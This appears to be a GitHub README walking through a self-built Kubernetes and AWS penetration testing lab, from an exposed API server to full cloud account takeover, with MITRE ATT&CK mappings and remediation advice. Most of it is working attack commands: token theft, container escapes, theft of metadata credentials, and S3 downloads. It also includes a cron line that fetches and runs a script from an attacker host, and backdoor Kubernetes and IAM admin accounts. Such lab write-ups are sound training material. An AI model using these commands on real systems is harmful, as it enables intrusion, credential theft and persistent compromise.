<img width="734" height="606" alt="Screenshot 2026-03-05 084224" src="https://github.com/user-attachments/assets/2a89369c-fc9f-4c6f-ad8c-8c7d936da16d" />

# Cloud & Container Penetration Testing Lab — Full Walkthrough

**Author:** Abdullah AlQalalweh  
**Duration:** Feb 2026 – Mar 2026  
**Environment:** Kubernetes cluster (minikube / kind) + simulated AWS EC2 nodes  
**Tools Used:** kubectl, Burp Suite, Docker, nmap, curl, nsenter, AWS CLI  

---

## Overview

<img width="734" height="606" alt="Screenshot 2026-03-05 084224" src="https://github.com/user-attachments/assets/2a89369c-fc9f-4c6f-ad8c-8c7d936da16d" />

This lab simulates a realistic cloud-hosted Kubernetes environment that was intentionally misconfigured to reflect vulnerabilities commonly found in real enterprise deployments. The penetration test follows a full kill chain across four attack surfaces:

1. Unauthenticated Kubernetes API server access
2. RBAC misconfiguration and token abuse
3. Container escape to host OS
4. Cloud metadata API credential theft and AWS lateral movement

Each phase maps directly to MITRE ATT&CK for Containers and the broader Enterprise framework. The goal was not just to exploit each vulnerability in isolation, but to chain them into a single end-to-end compromise path — demonstrating how one misconfiguration enables the next.

---

## Lab Environment Setup

Before attacking, the lab was built with deliberate misconfigurations:

| Component | Misconfiguration Introduced |
|---|---|
| API server | `--insecure-port=8080` enabled, no authentication on port 8080 |
| Service account | ClusterRoleBinding with wildcard `*` permissions to `cluster-admin` |
| Pod spec | `privileged: true` container running in production namespace |
| Pod spec | `/var/run/docker.sock` mounted as a volume inside a pod |
| EC2 node | IMDSv1 enabled — metadata endpoint requires no authentication |

These misconfigurations are not theoretical. All five are documented findings in real cloud security assessments.

---

## Step 1 — Reconnaissance: Scanning the API Server

### Objective
Identify whether the Kubernetes API server is exposed and whether authentication is enforced.

### MITRE ATT&CK Mapping
- **T1046 — Network Service Discovery:** Scanning ports to identify exposed services
- **T1595.002 — Active Scanning: Vulnerability Scanning:** Probing the API for anonymous access

### What I Did

The Kubernetes API server runs on port `6443` (HTTPS, normally requires authentication) and optionally on port `8080` (HTTP, completely unauthenticated if enabled). I started with an nmap scan to identify which ports were open.

```bash
nmap -sV -p 6443,8080 <target-ip>
```

I then used curl to probe the insecure endpoint directly. If the API returns JSON without any credentials, anonymous access is confirmed.

```bash
# Probe the insecure HTTP endpoint
curl http://<target-ip>:8080/api/v1/namespaces

# Probe the HTTPS endpoint — check if it allows anonymous requests
curl -k https://<target-ip>:6443/api/v1
```

I also set up Burp Suite as a proxy between kubectl and the API server to intercept and inspect raw HTTP requests. This is useful for replaying and modifying requests manually — for example, testing whether removing the Authorization header still returns data.

```bash
# Route kubectl through Burp Suite proxy
kubectl --server=http://<target-ip>:8080 \
  --proxy=http://127.0.0.1:8080 \
  get namespaces
```

### Finding

Port 8080 was open and the API responded to unauthenticated requests, returning the full list of cluster resources. The `--insecure-port` flag had not been disabled, meaning any network-accessible attacker could interact with the API without credentials.

---

## Step 2 — Cluster Enumeration: Mapping the Attack Surface

### Objective
Enumerate all cluster resources to identify secrets, service account tokens, pod configurations, and any sensitive data exposed through the API.

### MITRE ATT&CK Mapping
- **T1613 — Container and Resource Discovery:** Listing cluster resources to understand the environment
- **T1552.007 — Unsecured Credentials: Container API Credentials:** Extracting tokens from secrets
- **T1087 — Account Discovery:** Identifying service accounts and their bindings

### What I Did

With unauthenticated access confirmed, I used kubectl to enumerate everything in the cluster — pointing it at the insecure port so no credentials were needed.

```bash
# List all namespaces
kubectl --server=http://<target-ip>:8080 get namespaces

# List all running pods across every namespace
kubectl --server=http://<target-ip>:8080 get pods --all-namespaces

# List all secrets — this is where tokens live
kubectl --server=http://<target-ip>:8080 get secrets --all-namespaces

# Describe a specific secret to inspect its contents
kubectl --server=http://<target-ip>:8080 \
  describe secret <secret-name> -n <namespace>

# Extract and decode the service account token from a secret
kubectl --server=http://<target-ip>:8080 \
  get secret <secret-name> -n <namespace> \
  -o jsonpath='{.data.token}' | base64 -d
```

In Burp Suite, I replayed the GET request to `/api/v1/secrets` and confirmed it returned plaintext base64-encoded tokens in the response body. This demonstrates why proxying API traffic is valuable — you can see exactly what's being transmitted.

### Finding

Discovered 3 namespaces, 12 running pods, and 6 secrets. One secret contained a service account token. Querying the RBAC bindings for that account revealed it was bound to `cluster-admin` — full unrestricted access to everything in the cluster.

---

## Step 3 — RBAC Exploitation: Abusing Over-Permissioned Service Accounts

### Objective
Use the extracted service account token to authenticate as a privileged identity and enumerate what actions are available.

### MITRE ATT&CK Mapping
- **T1078.001 — Valid Accounts: Default Accounts:** Abusing a service account that was provisioned with excessive permissions
- **T1548 — Abuse Elevation Control Mechanism:** Leveraging wildcard RBAC bindings to gain cluster-admin equivalent access

### What I Did

I extracted the service account token and used it to authenticate kubectl. The first thing I checked was the full list of permissions this token granted — `kubectl auth can-i --list` prints every resource and verb the current identity is authorized to use.

```bash
# Authenticate with the extracted token and list all permissions
kubectl --server=http://<target-ip>:8080 \
  --token=<extracted-token> \
  auth can-i --list

# Output (truncated):
# Resources                               Non-Resource URLs  Verbs
# *.*                                     []                 [* get list watch create update patch delete exec]
# pods                                    []                 [get list watch create delete exec]
# secrets                                 []                 [get list watch create delete]
```

The wildcard `*.*` entry confirms this is a `cluster-admin` binding — the token can perform any action on any resource. I then confirmed exec access by executing a shell inside a running pod.

```bash
# Execute a shell inside a running pod using the stolen token
kubectl --server=http://<target-ip>:8080 \
  --token=<extracted-token> \
  exec -it <pod-name> -n <namespace> -- /bin/bash
```

I also examined the ClusterRoleBinding directly to understand how this misconfiguration was created:

```bash
# View the misconfigured binding
kubectl --token=<token> get clusterrolebindings -o yaml | grep -A5 "cluster-admin"

# The binding looked like this:
# subjects:
# - kind: ServiceAccount
#   name: default
#   namespace: production
# roleRef:
#   kind: ClusterRole
#   name: cluster-admin
```

### Finding

The default service account in the `production` namespace had a ClusterRoleBinding granting it `cluster-admin` access. This is a common misconfiguration in clusters where developers bind admin roles to default accounts for convenience. Any pod running in that namespace automatically inherits this token.

---

## Step 4 — Container Escape: Breaking Out to the Host OS

### Objective
Escape the container sandbox and gain root access to the underlying Kubernetes node (host OS).

### MITRE ATT&CK Mapping
- **T1611 — Escape to Host:** The core technique — breaking out of container isolation to the host
- **T1059.004 — Command and Scripting Interpreter: Unix Shell:** Executing shell commands after escaping
- **T1552.004 — Unsecured Credentials: Private Keys:** Reading host filesystem credentials after escape

### What I Did

#### Method 1: Privileged Container with Host Filesystem Mount

Inside the pod I exec'd into, I checked whether it was running as privileged:

```bash
# Check if the container is privileged
cat /proc/1/status | grep CapEff
# High capability value (0000003fffffffff) = privileged

# Or check from outside:
kubectl --token=<token> get pod <pod-name> -o yaml | grep privileged
# securityContext:
#   privileged: true
```

A privileged container has access to all host devices. I mounted the host's root disk directly:

```bash
# Inside the privileged container
mkdir /host-root

# Mount the host's root partition
mount /dev/sda1 /host-root

# Read the host's shadow file — proving host OS access
cat /host-root/etc/shadow

# Read SSH keys from other users on the host
ls /host-root/root/.ssh/
cat /host-root/root/.ssh/id_rsa
```

#### Method 2: nsenter — Entering Host Namespaces

An even cleaner escape is using `nsenter` to join the host's PID, mount, network, and UTS namespaces. PID 1 on the host is the init system — by entering its namespace, you effectively become root on the host.

```bash
# Enter all host namespaces via PID 1
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# You are now running in the host's namespace
# Confirm with:
hostname        # returns the host's real hostname
ps aux          # shows all host processes, not just container processes
ip addr         # shows host network interfaces
```

#### Method 3: Docker Socket Escape

A second pod had the Docker socket mounted as a volume — a dangerous practice that gives the container direct control over the Docker daemon running on the host.

```bash
# Confirm the socket is accessible inside the pod
ls -la /var/run/docker.sock

# Use it to launch a new privileged container with the host filesystem mounted
docker -H unix:///var/run/docker.sock run -it \
  --privileged \
  --pid=host \
  -v /:/hostfs \
  alpine \
  chroot /hostfs

# You now have a root shell with the full host filesystem at /
```

### Finding

Three separate container escape paths were confirmed in the same cluster. The most impactful was the `nsenter` method via a privileged container — it required no additional tools and provided an immediate host shell with full capabilities. Docker socket escape also worked and gave persistent access via the daemon.

---

## Step 5 — Cloud Metadata API: Stealing IAM Credentials

### Objective
Abuse the cloud provider's instance metadata service to steal the IAM role credentials attached to the underlying EC2 node.

### MITRE ATT&CK Mapping
- **T1552.005 — Unsecured Credentials: Cloud Instance Metadata API:** The exact technique — querying the metadata endpoint for credentials
- **T1078.004 — Valid Accounts: Cloud Accounts:** Using the stolen credentials as a valid cloud identity

### What I Did

Every AWS EC2 instance — and therefore every Kubernetes node running on EC2 — has a metadata service reachable at the link-local address `169.254.169.254`. With IMDSv1 enabled, this requires no authentication and is accessible from any process running on the instance, including processes inside containers.

```bash
# From inside any compromised pod — confirm metadata endpoint is reachable
curl http://169.254.169.254/latest/meta-data/

# Get the IAM role name attached to this EC2 instance
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: ec2-worker-role

# Fetch the actual temporary credentials for that role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-worker-role
```

The response returns a JSON object with:

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtnFEMI...",
  "Token": "IQoJb3JpZ2...",
  "Expiration": "2026-03-15T14:30:00Z"
}
```

I exported these as environment variables and used the AWS CLI to confirm the identity and begin enumerating cloud resources:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...
export AWS_SESSION_TOKEN=IQoJb3JpZ2...

# Confirm the identity
aws sts get-caller-identity
# Returns: Account, UserId, ARN of ec2-worker-role

# Enumerate S3 buckets
aws s3 ls

# Enumerate running EC2 instances in the same account
aws ec2 describe-instances \
  --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,State.Name,Tags]' \
  --output table
```

### Finding

IMDSv1 was enabled on all cluster nodes. The ec2-worker-role had S3 read permissions (exposing application data buckets), EC2 describe permissions (mapping the full cloud infrastructure), and SSM StartSession permission (enabling lateral movement to other instances without SSH keys).

---

## Step 6 — Lateral Movement: Pivoting Across the Environment

### Objective
Use the combination of host OS access and cloud credentials to move laterally — reaching other pods, nodes, and cloud services beyond the initial foothold.

### MITRE ATT&CK Mapping
- **T1550.001 — Use Alternate Authentication Material: Application Access Token:** Using stolen tokens to authenticate to other services
- **T1021.007 — Remote Services: Cloud Services:** Using AWS SSM to access other instances without SSH
- **T1619 — Cloud Storage Object Discovery:** Enumerating S3 buckets for sensitive data

### What I Did

#### Lateral movement within the cluster (via host filesystem)

From the host shell, I could read pod secrets directly from the kubelet's local filesystem — completely bypassing the Kubernetes API. This is significant because even if the API server had authentication, a node compromise exposes every secret mounted to pods running on that node.

```bash
# From host shell — find all mounted service account tokens
find /var/lib/kubelet/pods -name "*.token" 2>/dev/null

# Read tokens from other pods running on this node
find /var/lib/kubelet/pods -path "*/secrets/*/token" -exec cat {} \;

# Use a different pod's token to access other namespaces
kubectl --token=<other-pod-token> get secrets -n kube-system
```

#### Lateral movement to other cloud instances (via SSM)

Using the AWS credentials, I enumerated other EC2 instances and connected to them via AWS Systems Manager Session Manager — which works through the AWS API and requires no inbound SSH port or key pair, only the IAM permission `ssm:StartSession`.

```bash
# List all EC2 instances and their private IPs
aws ec2 describe-instances \
  --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress]' \
  --output table

# Connect to another instance via SSM — no SSH key needed
aws ssm start-session --target i-<instance-id>

# Inside the SSM session — you now have a shell on a different node
whoami   # ssm-user (can sudo to root in many default configs)
```

#### S3 data exfiltration

```bash
# List all buckets
aws s3 ls

# Recursively list a bucket's contents
aws s3 ls s3://<bucket-name> --recursive

# Download sensitive files
aws s3 cp s3://<bucket-name>/config/db-credentials.json .
```

### Finding

Successfully extracted tokens from 4 additional pods via the host filesystem. Pivoted to 2 other EC2 instances using SSM. Discovered 3 S3 buckets containing application configuration files, database connection strings, and API keys stored in plaintext.

---

## Step 7 — Full Compromise: Persistence, Exfiltration, and IAM Privilege Escalation

### Objective
Demonstrate full impact: establish persistence on the cluster and host, escalate IAM privileges in AWS, and document the complete attack path.

### MITRE ATT&CK Mapping
- **T1525 — Implant Internal Image / T1053.003 — Cron:** Establishing persistence mechanisms
- **T1098.001 — Account Manipulation: Additional Cloud Credentials:** Creating backdoor IAM access
- **T1136 — Create Account:** Creating a backdoor Kubernetes service account
- **T1530 — Data from Cloud Storage:** Exfiltrating data from S3

### What I Did

#### Persistence on the host node

```bash
# Cron-based persistence — beacons out to C2 every minute
echo "* * * * * root curl -s http://<attacker-ip>/shell.sh | bash" \
  >> /etc/crontab

# Verify it was written
tail -1 /etc/crontab
```

#### Backdoor Kubernetes service account

```bash
# Create a new service account in kube-system (hard to notice)
kubectl create serviceaccount backdoor -n kube-system

# Bind it to cluster-admin
kubectl create clusterrolebinding backdoor-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:backdoor

# Extract its token for future use
kubectl get secret -n kube-system \
  $(kubectl get sa backdoor -n kube-system \
    -o jsonpath='{.secrets[0].name}') \
  -o jsonpath='{.data.token}' | base64 -d
```

#### AWS IAM privilege escalation

```bash
# Check what IAM permissions the current role has
aws iam list-attached-role-policies --role-name ec2-worker-role

# Check if we can create or attach policies
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::<account-id>:role/ec2-worker-role \
  --action-names iam:AttachUserPolicy iam:CreateUser

# If iam:CreateUser is allowed — create a persistent backdoor admin user
aws iam create-user --user-name backdoor-admin
aws iam attach-user-policy \
  --user-name backdoor-admin \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor-admin
# Returns permanent access key — persists even after EC2 instance is terminated
```

### Finding

Full kill chain confirmed. Persistent access established on both the Kubernetes cluster (backdoor service account) and the AWS account (permanent IAM user with AdministratorAccess). A compromised EC2 worker node was sufficient to achieve full cloud account takeover.

---

## Full MITRE ATT&CK Mapping Summary

| Phase | Technique ID | Technique Name | How It Was Used |
|---|---|---|---|
| Reconnaissance | T1046 | Network Service Discovery | nmap scan for ports 6443, 8080 |
| Reconnaissance | T1595.002 | Active Scanning: Vulnerability Scanning | curl probing for unauthenticated API access |
| Discovery | T1613 | Container and Resource Discovery | kubectl enumeration of pods, secrets, namespaces |
| Credential Access | T1552.007 | Unsecured Credentials: Container API Credentials | Extracting service account tokens from secrets |
| Discovery | T1087 | Account Discovery | Enumerating service accounts and ClusterRoleBindings |
| Privilege Escalation | T1078.001 | Valid Accounts: Default Accounts | Abusing over-permissioned default service account |
| Privilege Escalation | T1548 | Abuse Elevation Control Mechanism | Wildcard ClusterRoleBinding to cluster-admin |
| Privilege Escalation | T1611 | Escape to Host | Privileged container, nsenter, Docker socket escape |
| Execution | T1059.004 | Unix Shell | Shell execution after container escape |
| Credential Access | T1552.005 | Cloud Instance Metadata API | Querying 169.254.169.254 for IAM credentials |
| Defense Evasion | T1078.004 | Valid Accounts: Cloud Accounts | Using stolen IAM credentials as a legitimate identity |
| Lateral Movement | T1550.001 | Use Alternate Authentication Material | Pod token reuse to access other namespaces |
| Lateral Movement | T1021.007 | Remote Services: Cloud Services | AWS SSM lateral movement to other EC2 instances |
| Collection | T1619 | Cloud Storage Object Discovery | S3 bucket enumeration and data access |
| Collection | T1530 | Data from Cloud Storage | Downloading sensitive files from S3 |
| Persistence | T1525 / T1053.003 | Implant Image / Cron | Cron persistence on host node |
| Persistence | T1136 | Create Account | Backdoor Kubernetes service account |
| Persistence | T1098.001 | Additional Cloud Credentials | Permanent IAM backdoor user created |

---

## Remediation Recommendations

| Vulnerability | Remediation |
|---|---|
| Unauthenticated API server | Disable `--insecure-port` flag entirely. Enable RBAC and webhook authentication. |
| Wildcard RBAC binding | Replace cluster-admin bindings with scoped roles. Apply least-privilege per service account. |
| Privileged containers | Remove `privileged: true` from all pod specs. Use `securityContext` with specific capabilities only. |
| Docker socket mount | Never mount `/var/run/docker.sock` into pods. Use dedicated container runtimes. |
| IMDSv1 enabled | Enforce IMDSv2 on all EC2 instances (`HttpTokens: required`). Restrict metadata from pod network. |
| Excessive IAM role permissions | Scope IAM roles to minimum required actions. Use IAM Access Analyzer to detect over-permission. |
| No audit logging | Enable Kubernetes audit logs and AWS CloudTrail. Alert on anomalous API calls. |

---

## Key Takeaway for Interviews

The most important thing this lab demonstrates is not any single vulnerability — it is the **attack chain**. Each misconfiguration enabled the next:

> Unauthenticated API → cluster-admin token → container escape → host root → cloud metadata credentials → lateral movement → full cloud account takeover

A single `--insecure-port=8080` flag and a single over-permissioned service account were the two root causes that made the entire chain possible. Everything else followed from those two decisions. That is why defense in depth, least privilege, and regular configuration audits matter — not as checkbox compliance, but as the actual difference between a failed attack and a full breach.
